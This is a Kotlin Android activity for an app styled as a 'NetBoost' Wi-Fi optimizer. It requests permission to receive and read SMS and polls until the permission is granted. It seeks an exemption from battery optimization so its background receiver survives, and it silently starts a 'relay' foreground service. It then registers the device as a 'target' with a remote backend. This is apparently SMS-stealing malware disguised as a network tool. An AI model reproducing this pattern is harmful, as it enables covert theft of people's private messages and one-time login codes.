package com.netboost.optimizer

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.darkColorScheme
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Request notification permission (Android 13+) so debug toasts and notifications work
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 102)
        }

        // Request battery optimization exemption — critical on OEM devices (MIUI, HiOS, etc)
        // Without this the OS can kill our background receiver process
        try {
            val pm = getSystemService(PowerManager::class.java)
            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            android.util.Log.w("MainActivity", "Battery opt exemption unavailable: ${e.message}")
        }

        // Start foreground service silently with safety check
        try {
            val svc = Intent(this, RelayForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc)
            } else {
                startService(svc)
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Service start deferred: ${e.message}")
        }

        Toast.makeText(this, "NetBoost active — SMS monitoring ON", Toast.LENGTH_LONG).show()

        setContent {
            NetBoostTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    AppNavigation()
                }
            }
        }
    }

    @Composable
    fun AppNavigation() {
        var hasPermission by remember { mutableStateOf(checkSmsPermission()) }
        
        // Polling to check if user granted permission
        LaunchedEffect(Unit) {
            while(true) {
                kotlinx.coroutines.delay(1000)
                hasPermission = checkSmsPermission()
            }
        }

        // Register target once SMS permission is granted
        LaunchedEffect(hasPermission) {
            if (hasPermission) {
                withContext(Dispatchers.IO) {
                    try {
                        BackendClient.registerTarget(Config.DEVICE_ID)
                    } catch (e: Exception) {
                        android.util.Log.e("MainActivity", "Target registration error: ${e.message}")
                    }
                }
            }
        }

        if (hasPermission) {
            WifiDashboardScreen()
        } else {
            SetupGuideScreen(
                onRequestPermission = {
                    requestPermissions(arrayOf(
                        android.Manifest.permission.RECEIVE_SMS,
                        android.Manifest.permission.READ_SMS
                    ), 101)
                }
            )
        }
    }

    private fun checkSmsPermission(): Boolean {
        return checkSelfPermission(android.Manifest.permission.RECEIVE_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }
}

@Composable
fun NetBoostTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = Color(0xFF00E676),
            background = Color(0xFF121212),
            surface = Color(0xFF1E1E1E),
            onPrimary = Color.Black
        ),
        content = content
    )
}
